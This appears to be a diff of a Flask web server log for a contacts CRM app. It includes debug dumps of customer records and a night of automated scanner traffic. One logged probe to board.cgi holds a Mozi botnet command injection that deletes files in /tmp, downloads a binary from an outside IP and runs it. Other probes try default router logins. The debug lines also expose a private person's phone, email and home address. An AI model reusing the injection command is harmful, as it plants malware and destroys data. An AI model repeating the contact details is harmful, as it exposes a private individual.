+[DEBUG] Ответ contacts: [{'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 14, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}]}]
+[DEBUG] Загружено контактов: 4
+[DEBUG] Ответ contacts: [{'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 14, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 4, 'name': 'ТОВ КЕГЛИ'}, {'id': 5, 'name': 'Dom ЕЕЕ №УВ'}]}]
+[DEBUG] Загружено контактов: 3
+[DEBUG] Ответ contacts: [{'id': 10, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 11, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': '', 'department': '', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}, {'id': 12, 'firstName': 'Dubrovin', 'lastName': 'Anatolevich', 'middleName': 'Sergey', 'position': 'ujkjdf', 'department': 'Обслуговуюча компанія', 'phone': '+380677604317', 'mobile': '', 'email': 'dsergeod@gmail.com', 'website': '', 'skype': '', 'company': '', 'industry': '', 'contactType': 'customer', 'city': 'НИКОЛАЕВ', 'street': 'ЛАЗУРНАЯ 36, Б, 113', 'postalCode': '54058', 'status': 'active', 'description': '', 'counterparties': [{'id': 6, 'name': 'ТОВ УК БРИЗ ПРО'}]}]
+[DEBUG] Загружено контактов: 2
+2025-07-01 22:54:44,673 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:44] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:54:46,994 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:46] "DELETE /api/contacts/11 HTTP/1.0" 200 -
+2025-07-01 22:54:47,002 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:47] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:54:47,013 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:47] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:54:49,458 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:49] "DELETE /api/contacts/10 HTTP/1.0" 200 -
+2025-07-01 22:54:49,465 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:49] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:54:49,473 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:54:49] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:56:54,884 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:56:54] "[32mPOST /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:56:54,895 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:56:54] "POST /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 22:56:54,905 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:56:54] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 22:56:54,913 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 22:56:54] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 23:01:23,736 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:01:23] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-01 23:15:14,382 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:15:14] "PUT /api/contacts/15 HTTP/1.0" 200 -
+2025-07-01 23:15:14,432 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:15:14] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-01 23:15:14,552 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:15:14] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-01 23:19:23,077 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:19:23] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-01 23:30:32,376 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:30:32] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-01 23:30:35,624 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:30:35] "GET /login HTTP/1.0" 200 -
+2025-07-01 23:30:35,979 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:30:35] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-01 23:37:41,112 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:37:41] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-01 23:45:42,024 - werkzeug - INFO - 127.0.0.1 - - [01/Jul/2025 23:45:42] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 00:05:46,313 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:05:46] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:14:43,110 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:14:43] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 00:15:26,479 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:15:26] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:23:23,075 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:23:23] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:23:49,465 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:23:49] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:24:02,284 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:24:02] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:24:06,486 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:24:06] "GET /login HTTP/1.0" 200 -
+2025-07-02 00:24:06,908 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:24:06] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 00:24:13,982 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:24:13] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+2025-07-02 00:43:43,607 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:43:43] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 00:53:51,819 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:53:51] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:58:56,923 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:58:56] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:59:05,966 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:59:05] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 00:59:09,182 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:59:09] "GET /login HTTP/1.0" 200 -
+2025-07-02 00:59:09,480 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:59:09] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 00:59:16,008 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 00:59:16] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+2025-07-02 01:08:55,539 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:08:55] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 01:16:16,109 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:16:16] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 01:17:30,465 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:17:30] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 01:27:54,802 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:27:54] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 01:38:33,606 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:38:33] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 01:39:22,230 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:39:22] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 01:45:51,461 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:45:51] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 01:47:05,660 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:47:05] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 01:48:33,143 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:48:33] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 01:56:25,023 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 01:56:25] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.0[0m" 404 -
+2025-07-02 02:15:40,718 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 02:15:40] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 02:16:49,247 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 02:16:49] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 02:27:17,684 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 02:27:17] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 02:42:00,663 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 02:42:00] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 03:05:30,983 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:05:30] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 03:13:34,241 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:13:34] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 03:23:15,241 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:23:15] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 03:41:57,345 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:41:57] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 03:46:21,728 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:46:21] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 03:51:09,821 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:51:09] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 03:59:07,664 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 03:59:07] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:09:30,894 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:09:30] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 04:21:00,400 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:21:00] "[33mGET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0[0m" 404 -
+2025-07-02 04:24:06,673 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:24:06] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:24:21,714 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:24:21] "GET /login HTTP/1.0" 200 -
+2025-07-02 04:24:24,859 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:24:24] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 04:24:45,406 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:24:45] "GET /login HTTP/1.0" 200 -
+2025-07-02 04:27:22,732 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:27:22] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:31:07,239 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:31:07] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:38:03,096 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:38:03] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 04:42:11,681 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:42:11] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:46:44,364 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:46:44] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:46:45,546 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:46:45] "GET /login HTTP/1.0" 200 -
+2025-07-02 04:59:34,655 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:59:34] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 04:59:34,732 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 04:59:34] "GET /login HTTP/1.0" 200 -
+2025-07-02 05:08:06,914 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:08:06] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 05:15:11,710 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:15:11] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 05:17:42,322 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:17:42] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 05:17:49,916 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:17:49] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 05:17:50,091 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:17:50] "GET /login HTTP/1.0" 200 -
+2025-07-02 05:18:09,652 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:18:09] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 05:18:23,006 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:18:23] "[32mGET /?format=json HTTP/1.0[0m" 302 -
+2025-07-02 05:18:52,221 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:18:52] "[33mGET /geoserver/web/ HTTP/1.0[0m" 404 -
+2025-07-02 05:21:31,977 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:21:31] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 05:31:12,039 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:31:12] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 05:38:06,238 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:38:06] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 05:54:14,159 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 05:54:14] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 06:03:47,409 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:03:47] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 06:05:29,372 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:05:29] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 06:36:44,194 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:36:44] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 06:37:16,172 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:37:16] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 06:41:20,433 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:41:20] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 06:50:09,602 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:50:09] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 06:59:57,176 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 06:59:57] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 07:03:23,156 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 07:03:23] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 07:17:34,564 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 07:17:34] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 07:20:26,504 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 07:20:26] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 07:29:17,522 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 07:29:17] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 07:36:34,192 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 07:36:34] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 07:57:51,852 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 07:57:51] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 08:00:16,917 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:00:16] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 08:14:43,506 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:14:43] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 08:29:16,019 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:29:16] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 08:29:27,181 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:29:27] "[33mGET /cgi-bin/diagnostics.cgi HTTP/1.0[0m" 404 -
+2025-07-02 08:32:56,977 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:32:56] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 08:39:49,176 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:39:49] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 08:45:33,822 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:45:33] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 08:57:45,228 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 08:57:45] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 09:17:25,866 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:17:25] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 09:25:29,630 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:25:29] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 09:34:30,158 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:34:30] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 09:34:30,453 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:34:30] "GET /login HTTP/1.0" 200 -
+2025-07-02 09:38:02,524 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:38:02] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 09:50:23,147 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:50:23] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://175.107.2.217:59571/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0[0m" 404 -
+2025-07-02 09:52:11,627 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:52:11] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 09:56:43,993 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 09:56:43] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 10:22:35,911 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:22:35] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 10:25:08,773 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:25:08] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 10:36:56,842 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:36:56] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 10:40:40,445 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:40:40] "[33mPOST /api/sys/login HTTP/1.0[0m" 404 -
+2025-07-02 10:40:40,540 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:40:40] "[33mPOST /bf/tracert HTTP/1.0[0m" 404 -
+2025-07-02 10:56:02,993 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:56:02] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 10:56:45,970 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:56:45] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 10:59:36,842 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 10:59:36] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:15:19,675 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:15:19] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:19:42,816 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:19:42] "[33mGET /json/ HTTP/1.0[0m" 404 -
+2025-07-02 11:21:14,778 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:21:14] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 11:23:02,542 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:23:02] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:23:07,714 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:23:07] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:23:08,058 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:23:08] "GET /login HTTP/1.0" 200 -
+2025-07-02 11:23:08,261 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:23:08] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 11:23:27,951 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:23:27] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:23:28,083 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:23:28] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:29:00,890 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:29:00] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:29:01,031 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:29:01] "GET /login HTTP/1.0" 200 -
+2025-07-02 11:31:54,273 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:31:54] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 11:48:21,345 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 11:48:21] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 12:00:26,604 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:00:26] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 12:16:07,513 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:16:07] "[32mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0[0m" 302 -
+2025-07-02 12:16:07,598 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:16:07] "GET /login HTTP/1.0" 200 -
+2025-07-02 12:19:53,743 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:19:53] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 12:25:08,252 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:25:08] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 12:33:11,601 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:33:11] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 12:51:51,883 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:51:51] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 12:57:04,744 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 12:57:04] "[33mGET /actuator/gateway/routes HTTP/1.0[0m" 404 -
+2025-07-02 13:00:07,943 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:00:07] "[33mGET /get.php HTTP/1.0[0m" 404 -
+2025-07-02 13:07:40,212 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:07:40] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 13:07:57,539 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:07:57] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 13:15:26,003 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:15:26] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 13:37:34,291 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:37:34] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 13:44:03,651 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:44:03] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 13:45:14,110 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:45:14] "[33mGET /login.asp HTTP/1.0[0m" 404 -
